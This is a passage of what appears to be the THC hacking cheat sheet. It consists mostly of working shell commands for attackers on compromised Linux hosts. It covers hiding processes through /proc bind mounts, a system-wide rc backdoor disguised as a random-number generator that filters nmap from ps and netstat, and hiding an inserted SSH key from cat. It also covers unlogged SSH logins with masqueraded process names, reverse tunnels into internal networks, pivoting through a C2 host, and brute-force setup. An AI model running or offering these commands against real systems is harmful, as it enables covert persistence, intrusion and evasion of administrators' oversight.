&#39;${_x//\&#39;/\&#39;\&#34;\&#39;\&#34;\&#39;}&#39;&#34;; done&#xA;    [[ $(bash -c &#34;ps -o stat= -p \$\$&#34;) =~ \+ ]] || exec bash -c &#34;mount -n --bind /dev/shm /proc/\$\$; exec \&#34;$1\&#34; $_argstr&#34;&#xA;    bash -c &#34;mount -n --bind /dev/shm /proc/\$\$; exec \&#34;$1\&#34; $_argstr&#34;&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;To hide a command use:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;hide                                 # Hides the current shell/PID&#xA;hide 31337                           # Hides process with pid 31337&#xA;hide sleep 1234                      # Hides &#39;sleep 1234&#39;&#xA;hide nohup sleep 1234 &amp;amp;&amp;gt;/dev/null &amp;amp;  # Starts and hides &#39;sleep 1234&#39; as a background process&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;(thanks to &lt;em&gt;druichi&lt;/em&gt; for improving this)&lt;/p&gt; &#xA;&lt;p&gt;&lt;a id=&#34;hide-scripts&#34;&gt;&lt;/a&gt; &lt;strong&gt;1.vii. Hide shell scripts&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Above we discussed how to obfuscate a line in ~/.bashrc. An often used trick is to use &lt;code&gt;source&lt;/code&gt; instead. The source command can be shortened to &lt;code&gt;.&lt;/code&gt; (yes, a dot) &lt;em&gt;and&lt;/em&gt; it also searches through the $PATH variable to find the file to load.&lt;/p&gt; &#xA;&lt;p&gt;In this example our script &lt;code&gt;prng&lt;/code&gt; contains all of our shell functions from above. Those functions hide the &lt;code&gt;nmap&lt;/code&gt; process and the network connection. Last we add &lt;code&gt;. prng&lt;/code&gt; into the systemwide rc file. This will load &lt;code&gt;prng&lt;/code&gt; when the user (and root) logs in:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;echo -e &#39;netstat(){ command netstat &#34;$@&#34; | grep -Fv -e :31337 -e 1.2.3.4; }&#xA;ps(){ command ps &#34;$@&#34; | exec -a GREP grep -Fv -e nmap  -e GREP; }&#39; &amp;gt;/usr/bin/prng \&#xA;&amp;amp;&amp;amp; echo &#34;. prng #Initialize Pseudo Random Number Generator&#34; &amp;gt;&amp;gt;/etc/bash.bashrc \&#xA;&amp;amp;&amp;amp; touch -r /etc/ld.so.conf /usr/bin/prng /etc/bash.bashrc&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;(The same works for &lt;code&gt;lsof&lt;/code&gt;, &lt;code&gt;ss&lt;/code&gt; and &lt;code&gt;ls&lt;/code&gt;)&lt;/p&gt; &#xA;&lt;p&gt;&lt;a id=&#34;cat&#34;&gt;&lt;/a&gt; &lt;strong&gt;1.viii. Hide from cat&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;ANSI escape characters or a simple &lt;code&gt;\r&lt;/code&gt; (&lt;a href=&#34;https://www.hahwul.com/2019/01/23/php-hidden-webshell-with-carriage/&#34;&gt;carriage return&lt;/a&gt;) can be used to hide from &lt;code&gt;cat&lt;/code&gt; and others.&lt;/p&gt; &#xA;&lt;p&gt;Hide the last command (example: &lt;code&gt;id&lt;/code&gt;) in &lt;code&gt;~/.bashrc&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;echo -e &#34;id #\\033[2K\\033[1A&#34; &amp;gt;&amp;gt;~/.bashrc&#xA;### The ANSI escape sequence \\033[2K erases the line. The next sequence \\033[1A&#xA;### moves the cursor 1 line up.&#xA;### The &#39;#&#39; after the command &#39;id&#39; is a comment and is needed so that bash still&#xA;### executes the &#39;id&#39; but ignores the two ANSI escape sequences.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Note: We use &lt;code&gt;echo -e&lt;/code&gt; to convert &lt;code&gt;\\033&lt;/code&gt; to the ANSI escape character (hex 0x1b).&lt;/p&gt; &#xA;&lt;p&gt;Adding a &lt;code&gt;\r&lt;/code&gt; (carriage return) goes a long way to hide your ssh key from &lt;code&gt;cat&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;echo &#34;ssh-ed25519 AAAAOurPublicKeyHere....blah x@y&#34;$&#39;\r&#39;&#34;$(&amp;lt;authorized_keys)&#34; &amp;gt;authorized_keys&#xA;### This adds our key as the first key and &#39;cat authorized_keys&#39; wont show&#xA;### it. The $&#39;\r&#39; is a bash special to create a \r (carriage return).&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;hr&gt; &#xA;&lt;p&gt;&lt;a id=&#34;ssh&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;2. SSH&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a id=&#34;ssh-invisible&#34;&gt;&lt;/a&gt; &lt;strong&gt;2.i. Almost invisible SSH&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Stops you from showing up in &lt;em&gt;w&lt;/em&gt; or &lt;em&gt;who&lt;/em&gt; command and stops logging the host to &lt;em&gt;~/.ssh/known_hosts&lt;/em&gt;.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;ssh -o UserKnownHostsFile=/dev/null -T user@server.org &#34;bash -i&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Go full comfort with PTY and colors: &lt;code&gt;thcssh user@server.org&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;### Cut &amp;amp; Paste the following to your shell, then execute&#xA;### thcssh user@server.org&#xA;thcssh()&#xA;{&#xA;    local ttyp&#xA;    echo -e &#34;\e[0;35mTHC says: pimp up your prompt: Cut &amp;amp; Paste the following into your remote shell:\e[0;36m&#34;&#xA;    echo -e &#39;PS1=&#34;{THC} \[\\033[36m\]\\u\[\\033[m\]@\[\\033[32m\]\\h:\[\\033[33;1m\]\\w\[\\033[m\]\\$ &#34;\e[0m&#39;&#xA;    ttyp=$(stty -g)&#xA;    stty raw -echo opost&#xA;    [[ $(ssh -V 2&amp;gt;&amp;amp;1) == OpenSSH_[67]* ]] &amp;amp;&amp;amp; a=&#34;no&#34;&#xA;    ssh -o UpdateHostKeys=no -o StrictHostKeyChecking=&#34;${a:-accept-new}&#34; -T \&#xA;        &#34;$@&#34; \&#xA;        &#34;unset SSH_CLIENT SSH_CONNECTION; TERM=xterm-256color BASH_HISTORY=/dev/null exec -a [ntp] script -qc &#39;exec -a [uid] /bin/bash -i&#39; /dev/null&#34;&#xA;    stty &#34;${ttyp}&#34;&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;a id=&#34;ssh-tunnel&#34;&gt;&lt;/a&gt; &lt;strong&gt;2.ii SSH tunnel&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;We use this all the time to circumvent local firewalls and IP filtering:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;ssh -g -L31337:1.2.3.4:80 user@server.org&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You or anyone else can now connect to your computer on port 31337 and get tunneled to 1.2.3.4 port 80 and appear with the source IP of &#39;server.org&#39;. An alternative and without the need for a server is to use &lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#backdoor-network&#34;&gt;gs-netcat&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Clever hackers use the keyboard combination &lt;code&gt;~C&lt;/code&gt; to dynamically create these tunnels without having to reconnect the SSH. (thanks MessedeDegod).&lt;/p&gt; &#xA;&lt;p&gt;We use this to give access to a friend to an internal machine that is not on the public Internet:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;ssh -o ExitOnForwardFailure=yes -g -R31338:192.168.0.5:80 user@server.org&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Anyone connecting to server.org:31338 will get tunneled to 192.168.0.5 on port 80 via your computer. An alternative and without the need for a server is to use &lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#backdoor-network&#34;&gt;gs-netcat&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a id=&#34;ssh-socks-tunnel&#34;&gt;&lt;/a&gt; &lt;strong&gt;2.iii SSH socks4/5 tunnel&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;OpenSSH 7.6 adds socks support for dynamic forwarding. Example: Tunnel all your browser traffic through your server.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;ssh -D 1080 user@server.org&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Now configure your browser to use SOCKS with 127.0.0.1:1080. All your traffic is now tunneled through &lt;em&gt;server.org&lt;/em&gt; and will appear with the source IP of &lt;em&gt;server.org&lt;/em&gt;. An alternative and without the need for a server is to use &lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#backdoor-network&#34;&gt;gs-netcat&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;This is the reverse of the above example. It give others access to your &lt;em&gt;local&lt;/em&gt; network or let others use your computer as a tunnel end-point.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;ssh -g -R 1080 user@server.org&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The others configuring server.org:1080 as their SOCKS4/5 proxy. They can now connect to &lt;em&gt;any&lt;/em&gt; computer on &lt;em&gt;any port&lt;/em&gt; that your computer has access to. This includes access to computers behind your firewall that are on your local network. An alternative and without the need for a server is to use &lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#backdoor-network&#34;&gt;gs-netcat&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a id=&#34;ssh-j&#34;&gt;&lt;/a&gt; &lt;strong&gt;2.iv SSH to a host behind NAT&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;http://ssh-j.com&#34;&gt;ssh-j.com&lt;/a&gt; provides a great relay service: To access a host behind NAT/Firewall (via SSH).&lt;/p&gt; &#xA;&lt;p&gt;On the host behind NAT: Create a reverse SSH tunnel to &lt;a href=&#34;http://ssh-j.com&#34;&gt;ssh-j.com&lt;/a&gt; like so:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;## Cut &amp;amp; Paste on the host behind NAT.&#xA;ssh_j()&#xA;{&#xA;   local pw&#xA;   pw=$1&#xA;   [[ -z $pw ]] &amp;amp;&amp;amp; { pw=$(head -c64 &amp;lt;/dev/urandom | base64 | tr -d -c a-z0-9); pw=${pw:0:12}; }&#xA;   echo &#34;Press Ctrl-C to stop this tunnel.&#34;&#xA;   echo -e &#34;To connect to this host: \e[0;36mssh -J ${pw}@ssh-j.com ${USER:-root}@${pw}\e[0m&#34;&#xA;   ssh -o StrictHostKeyChecking=accept-new -o ServerAliveInterval=30 -o ExitOnForwardFailure=yes ${pw}@ssh-j.com -N -R ${pw}:22:${2:-0}:${3:-22}&#xA;}&#xA;&#xA;ssh_j                                 # Generates a random tunnel ID [e.g. 5dmxf27tl4kx] and keeps the tunnel connected&#xA;ssh_j foobarblahblub                  # Creates tunnel with specific tunnel ID&#xA;ssh_j foobarblahblub 192.168.0.1 2222 # Tunnel to host 192.168.0.1 on port 2222 on the LAN&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Then use this command from anywhere else in the world to connect as &#39;root&#39; to &#39;foobarblahblub&#39; (the host behind the NAT):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;ssh -J foobarblahblub@ssh-j.com root@foobarblahblub&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The ssh connection goes via ssh-j.com into the reverse tunnel to the host behind NAT. The traffic is end-2-end encrypted and ssh-j.com can not see the content.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a id=&#34;ssh-pj&#34;&gt;&lt;/a&gt; &lt;strong&gt;2.v SSH pivoting to multiple servers&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;SSH ProxyJump can save you a lot of time and hassle when working with remote servers. Let&#39;s assume the scenario:&lt;/p&gt; &#xA;&lt;p&gt;Our workstation is $local-kali and we like to SSH into $target-host. There is no direct connection between our workstation and $target-host. Our workstation can only reach $C2. $C2 can reach $internal-jumphost (via internal eth1) and $internal-jumphost can reach the final $target-host via eth2.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;          $local-kali       -&amp;gt; $C2            -&amp;gt; $internal-jumphost    -&amp;gt; $target-host&#xA;eth0      192.168.8.160      10.25.237.119             &#xA;eth1                         192.168.5.130       192.168.5.135&#xA;eth2                                             172.16.2.120             172.16.2.121&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;We do not execute &lt;code&gt;ssh&lt;/code&gt; on any computer but our trusted workstation - and neither shall you (ever).&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;That&#39;s where ProxyJump helps: We can &#39;jump&#39; via the two intermediary servers $C2 and $internal-jumphost (without spawning a shell on those servers). The ssh-connection is end-2-end encrypted between our $local-kali and $target-host and no password or key is exposed to $C2 or $internal-jumphost.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;## if we want to SSH to $target-host:&#xA;kali@local-kali$ ssh -J c2@10.25.237.119,jumpuser@192.168.5.135 target@172.16.2.121&#xA;&#xA;## if we want to SSH to just $internal-jumphost:&#xA;kali@local-kali$ ssh -J c2@10.25.237.119 jumpuser@192.168.5.135&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;We use this as well to hide our IP address when logging into servers.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;hr&gt; &#xA;&lt;p&gt;&lt;a id=&#34;network&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;3. Network&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a id=&#34;discover&#34;&gt;&lt;/a&gt; &lt;strong&gt;3.i. Discover hosts&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;## ARP disocer computers on the local network&#xA;nmap -r -sn -PR 192.168.0.1/24&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;## ICMP discover computers on the local netowrk&#xA;NET=&#34;10.11.0&#34;  # discover 10.11.0.1-10.11.0.254&#xA;seq 1 254 | xargs -P20 -I{} ping -n -c3 -i0.2 -w1 -W200 &#34;${NET:-192.168.0}.{}&#34; | grep &#39;bytes from&#39; | awk &#39;{print $4&#34; &#34;$7;}&#39; | sort -uV -k1,1&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;a id=&#34;tcpdump&#34;&gt;&lt;/a&gt; &lt;strong&gt;3.ii. tcpdump&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;## Monitor every new TCP connection&#xA;tcpdump -n &#34;tcp[tcpflags] == tcp-syn&#34;&#xA;&#xA;## Play a *bing*-noise for every new SSH connection&#xA;tcpdump -nlq &#34;tcp[13] == 2 and dst port 22&#34; | while read x; do echo &#34;${x}&#34;; echo -en \\a; done&#xA;&#xA;## Ascii output (for all large packets. Change to &amp;gt;40 if no TCP options are used).&#xA;tcpdump -s 2048 -nAq &#39;tcp and (ip[2:2] &amp;gt; 60)&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;a id=&#34;tunnel&#34;&gt;&lt;/a&gt; &lt;strong&gt;3.iii. Tunnel and forwarding&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;## Connect to SSL (using socat)&#xA;socat stdio openssl-connect:smtp.gmail.com:465&#xA;&#xA;## Connect to SSL (using openssl)&#xA;openssl s_client -connect smtp.gmail.com:465&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;## Bridge TCP to SSL&#xA;socat TCP-LISTEN:25,reuseaddr,fork  openssl-connect:smtp.gmail.com:465&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;a id=&#34;https&#34;&gt;&lt;/a&gt; &lt;strong&gt;3.iii.b. HTTPS reverse tunnels&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;On the server:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;### Reverse HTTPS tunnel to forward public HTTPS requests to Port 8080 on this server:&#xA;ssh -R80:0:8080 -o StrictHostKeyChecking=accept-new nokey@localhost.run&#xA;### Or using remote.moe&#xA;ssh -R80:0:8080 -o StrictHostKeyChecking=accept-new nokey@remote.moe&#xA;### Or using cloudflared&#xA;cloudflared tunnel --url http://localhost:8080 --no-autoupdate&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Either tunnel will generate a new HTTPS-URL for you. Use this URL on your workstation (see below). Use &lt;a href=&#34;https://iq.thc.org/tunnel-via-cloudflare-to-any-tcp-service&#34;&gt;Gost&lt;/a&gt; to tunnel raw TCP over the HTTP(s) link.&lt;/p&gt; &#xA;&lt;p&gt;A simple STDIN/STDOUT pipe via HTTPS:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;websocat -s 8080&#xA;### and on the workstation use this command to connect:&#xA;websocat wss://&amp;lt;HTTPS-URL&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Or run a Socks-Proxy (via HTTPS):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;### On the server&#xA;gost -L mws://:8080&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;On the workstation:&lt;/p&gt; &#xA;&lt;p&gt;Forward port 2222 to the server&#39;s port 22.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;gost -L tcp://:2222/127.0.0.1:22 -F &#39;mwss://&amp;lt;HTTPS-URL&amp;gt;:443&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;or use it as a Socks-Proxy:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;gost -L :1080 -F &#39;mwss://&amp;lt;HTTPS-URL&amp;gt;:443&#39;&#xA;### Test the Socks-proxy:&#xA;curl -x socks5h://0 ipinfo.io&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;More: &lt;a href=&#34;https://github.com/twelvesec/port-forwarding&#34;&gt;https://github.com/twelvesec/port-forwarding&lt;/a&gt; and &lt;a href=&#34;https://iq.thc.org/tunnel-via-cloudflare-to-any-tcp-service&#34;&gt;Tunnel via Cloudflare to any TCP Service&lt;/a&gt; and &lt;a href=&#34;https://github.com/anderspitman/awesome-tunneling&#34;&gt;Awesome Tunneling&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a id=&#34;scan-proxy&#34;&gt;&lt;/a&gt; &lt;strong&gt;3.iv. Use any tool via Socks Proxy&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;On the target&#39;s network:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;## Create a SOCKS proxy into the target&#39;s network.&#xA;## Use gs-netcat but ssh -D would work as well.&#xA;gs-netcat -l -S&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;On your workstation:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;## Create a gsocket tunnel into the target&#39;s network:&#xA;gs-netcat -p 1080&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;## Use ProxyChain to access any host on the target&#39;s network: &#xA;echo -e &#34;[ProxyList]\nsocks5 127.0.0.1 1080&#34; &amp;gt;pc.conf&#xA;proxychains -f pc.conf -q curl ipinfo.io&#xA;## Scan the router at 192.168.1.1&#xA;proxychains -f pc.conf -q nmap -n -Pn -sV -F --open 192.168.1.1&#xA;## Start 10 nmaps in parallel:&#xA;seq 1 254 | xargs -P10 -I{} proxychains -f pc.conf -q nmap -n -Pn -sV -F --open 192.168.1.{} &#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;a id=&#34;your-ip&#34;&gt;&lt;/a&gt; &lt;strong&gt;3.v. Find your public IP address&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;curl -s wtfismyip.com/json | jq&#xA;curl ifconfig.me&#xA;dig +short myip.opendns.com @resolver1.opendns.com&#xA;host myip.opendns.com resolver1.opendns.com&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Get geolocation information about any IP address:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;curl https://ipinfo.io/8.8.8.8 | jq&#xA;curl http://ip-api.com/8.8.8.8&#xA;curl https://cli.fyi/8.8.8.8&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Get ASN information by IP address:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;asn() {&#xA;  [[ -n $1 ]] &amp;amp;&amp;amp; { echo -e &#34;begin\nverbose\n${1}\nend&#34;|netcat whois.cymru.com 43| tail -n +2; return; }&#xA;  (echo -e &#39;begin\nverbose&#39;;cat -;echo end)|netcat whois.cymru.com 43|tail -n +2&#xA;}&#xA;asn 1.1.1.1           # Single IP Lookup&#xA;cat IPS.txt | asn     # Bulk Lookup&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Check if TOR is working:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;curl -x socks5h://localhost:9050 -s https://check.torproject.org/api/ip&#xA;### Result should be {&#34;IsTor&#34;:true...&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;a id=&#34;check-reachable&#34;&gt;&lt;/a&gt; &lt;strong&gt;3.vi. Check reachability from around the world&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;The fine people at &lt;a href=&#34;https://ping.pe/&#34;&gt;https://ping.pe/&lt;/a&gt; let you ping/traceroute/mtr/dig/port-check a host from around the world, check TCP ports, resolve a domain name, ...and many other things.&lt;/p&gt; &#xA;&lt;p&gt;To check how well your (current) host can reach Internet use &lt;a href=&#34;https://ooni.org/support/ooni-probe-cli&#34;&gt;OONI Probe&lt;/a&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;ooniprobe run im&#xA;ooniprobe run websites&#xA;ooniprobe list&#xA;ooniprobe list 1&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;a id=&#34;check-open-ports&#34;&gt;&lt;/a&gt; &lt;strong&gt;3.vii. Check/Scan Open Ports on an IP&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://search.censys.io/&#34;&gt;Censys&lt;/a&gt; or &lt;a href=&#34;https://internetdb.shodan.io&#34;&gt;Shodan&lt;/a&gt; Port lookup service:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;curl https://internetdb.shodan.io/1.1.1.1&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Fast (-F) vulnerability scan&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# Version gathering&#xA;nmap -sCV -F -Pn --min-rate 10000 scanme.nmap.org&#xA;# Vulns&#xA;nmap -A -F -Pn --min-rate 10000 --script vulners.nse --script-timeout=5s scanme.nmap.org&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;a id=&#34;bruteforce&#34;&gt;&lt;/a&gt; &lt;strong&gt;3.viii. Crack Password hashes&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;hashcat --username -w3 my-hash /usr/share/wordlists/rockyou.txt&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Read the &lt;a href=&#34;https://hashcat.net/wiki/doku.php?id=frequently_asked_questions&#34;&gt;FAQ&lt;/a&gt; or use &lt;a href=&#34;https://crackstation.net&#34;&gt;Crackstation&lt;/a&gt; or &lt;a href=&#34;https://github.com/someshkar/colabcat&#34;&gt;ColabCat/cloud&lt;/a&gt;/&lt;a href=&#34;https://github.com/JoelGMSec/Cloudtopolis&#34;&gt;Cloudtopolis&lt;/a&gt; or on &lt;a href=&#34;https://akimbocore.com/article/hashcracking-with-aws/&#34;&gt;AWS&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;3.ix. Brute Force Passwords&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;The following is for brute forcing (guessing) passwords of ONLINE SERVICES.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a id=&#34;gmail&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;GMail Imbeciles - CLICK HERE&lt;/summary&gt; &#xA; &lt;blockquote&gt; &#xA;  &lt;p&gt;You can not brute force GMAIL accounts.&lt;br&gt; SMTP AUTH/LOGIN IS DISABLED ON GMAIL.&lt;br&gt; All GMail Brute Force and Password Cracking tools are FAKE.&lt;/p&gt; &#xA; &lt;/blockquote&gt; &#xA;&lt;/details&gt; &#xA;&lt;p&gt;All tools are pre-installed on segfault:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;ssh root@segfaul.net # password is &#39;segfault&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;(You may want to use your &lt;a href=&#34;https://www.thc.org/segfault/wireguard&#34;&gt;own EXIT node&lt;/a&gt;)&lt;/p&gt; &#xA;&lt;p&gt;Tools:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://nmap.org/ncrack/man.html&#34;&gt;Ncrack&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://nmap.org/nsedoc/categories/brute.html&#34;&gt;Nmap BRUTE&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://sectools.org/tool/hydra/&#34;&gt;THC Hydra&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.geeksforgeeks.org/password-cracking-with-medusa-in-linux/&#34;&gt;Medusa&lt;/a&gt; / &lt;a href=&#34;http://foofus.net/goons/jmk/medusa/medusa.html&#34;&gt;docs&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.rapid7.com/metasploit/bruteforce-attacks/&#34;&gt;Metasploit&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Username &amp;amp; Password lists:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;/usr/share/nmap/nselib/data&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;/usr/share/wordlists/seclists/Passwords&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/berzerk0/Probable-Wordlists&#34;&gt;https://github.com/berzerk0/Probable-Wordlists&lt;/a&gt; - &amp;gt;THC&#39;s FAVORITE&amp;lt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/danielmiessler/SecLists&#34;&gt;https://github.com/danielmiessler/SecLists&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://wordlists.assetnote.io&#34;&gt;https://wordlists.assetnote.io&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://weakpass.com&#34;&gt;https://weakpass.com&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://crackstation.net/&#34;&gt;https://crackstation.net/&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Set &lt;strong&gt;U&lt;/strong&gt;sername/&lt;strong&gt;P&lt;/strong&gt;assword list and &lt;strong&gt;T&lt;/strong&gt;arget host.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;ULIST=&#34;/usr/share/wordlists/brutespray/mysql/user&#34;&#xA;PLIST=&#34;/usr/share/wordlists/seclists/Passwords/500-worst-passwords.txt&#34;&#xA;T=&#34;192.168.0.1&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Useful 